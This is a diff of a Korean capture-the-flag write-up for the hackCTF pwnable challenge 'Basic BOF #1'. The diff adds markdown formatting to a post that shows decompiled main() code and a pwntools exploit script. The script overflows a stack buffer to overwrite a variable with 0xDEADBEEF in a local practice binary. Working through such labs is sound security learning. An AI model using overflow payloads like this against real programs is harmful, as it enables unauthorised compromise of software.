@@ -2,12 +2,13 @@
 layout: post
 title:  "[hackCTF]Basic BOF #1"
 date:   2020-02-09
+categories: c python
 ---
 hackCTF pwnable 첫번째 문제
 
 ## ida
 ***
-```
+```c
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     char s; // [esp+4h] [ebp-34h]
@@ -34,10 +35,10 @@ payload를 v5까지 덮을 수 있도록 만들자.
 
 ## exploit.py
 ***
-```
+```python
   #!/usr/bin/python
   from pwn import *
-  
+
   p = process('./bof_basic')
 
   payload = "A"*(0x2c-0x4)+p32(0xDEADBEEF)
